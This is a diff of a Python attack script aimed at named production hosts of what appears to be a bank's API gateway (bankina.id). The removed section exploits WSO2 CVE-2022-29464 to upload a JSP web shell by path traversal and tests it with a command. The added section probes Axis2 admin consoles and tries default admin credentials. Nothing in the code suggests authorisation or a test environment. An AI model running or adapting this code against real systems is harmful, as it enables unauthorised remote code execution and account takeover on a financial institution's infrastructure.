@@ -52,36 +52,20 @@ except Exception as e:
 
 
 
-print("== V7: WSO2 CVE-2022-29464 ATTACK ==")
-import uuid
-
-def multipart_post(host, path, fields):
-    boundary = "----osint" + uuid.uuid4().hex
-    body = b""
-    for fname, fval in fields:
-        body += f"--{boundary}\r\n".encode()
-        body += ("Content-Disposition: form-data; name=\"" + fname + "\"\r\n\r\n").encode()
-        body += fval.encode() + b"\r\n"
-    body += f"--{boundary}--\r\n".encode()
-    r = urllib.request.Request("https://" + host + path, data=body, method="POST",
-        headers={"Content-Type": "multipart/form-data; boundary=" + boundary, "User-Agent": "Mozilla/5.0"})
-    try:
-        resp = urllib.request.urlopen(r, timeout=30, context=ctx)
-        return resp.status, resp.read()[:300].decode("utf-8", "ignore")
-    except urllib.error.HTTPError as e:
-        return e.code, e.read()[:300].decode("utf-8", "ignore")
-    except Exception as e:
-        return "ERR", str(e)[:100]
-
-JSP = '<%@ page import="java.util.*,java.io.*"%><% if (request.getParameter("cmd") != null) { Process p = Runtime.getRuntime().exec(request.getParameter("cmd")); BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream())); String l; while ((l = r.readLine()) != null) out.println(l); } %>'
-
-for host in ["api.bankina.id", "apigw-prod.bankina.id"]:
-    print("=== HOST: " + host + " ===")
-    for p in ["/carbon/login", "/carbon/admin/login.jsp", "/publisher", "/devportal"]:
-        s, b = req("GET", "https://" + host + p, {"User-Agent": "Mozilla/5.0"})
-        print("FP " + p + " => " + str(s) + " " + b[:70])
-    for fname in ["../../../../repository/deployment/server/webapps/authenticationendpoint/cmd.jsp", "cmd.jsp"]:
-        s, b = multipart_post(host, "/fileupload/toolsAny", [(fname, JSP)])
-        print("UPLOAD [" + fname[:60] + "] => " + str(s) + " " + b[:120])
-    s, b = req("GET", "https://" + host + "/authenticationendpoint/cmd.jsp?cmd=id", {"User-Agent": "Mozilla/5.0"})
-    print("SHELL CHECK => " + str(s) + " " + b[:200])
+print("== V8: AXIS2 ADMIN + SERVICE LIST ==")
+import base64 as b64mod
+# service list penuh
+s, b = req("GET", "https://apigw-prod.bankina.id/services/listServices", {"User-Agent": "Mozilla/5.0"})
+print("listServices:", s, b[:1500])
+# admin console
+for p in ["/axis2-admin/", "/axis2-admin/login", "/axis2-admin/listServices", "/axis2-web/"]:
+    s, b = req("GET", "https://apigw-prod.bankina.id" + p, {"User-Agent": "Mozilla/5.0"})
+    print("ADMIN " + p + " => " + str(s) + " " + b[:100])
+# default creds admin:axis2 (Basic auth)
+auth = "Basic " + b64mod.b64encode(b"admin:axis2").decode()
+for p in ["/axis2-admin/", "/axis2-admin/listServices", "/services/listServices"]:
+    s, b = req("GET", "https://apigw-prod.bankina.id" + p, {"User-Agent": "Mozilla/5.0", "Authorization": auth})
+    print("AUTH " + p + " => " + str(s) + " " + b[:150])
+# services di api.bankina.id (synapse)
+s, b = req("GET", "https://api.bankina.id/services/listServices", {"User-Agent": "Mozilla/5.0"})
+print("api.bankina.id listServices:", s, b[:600])
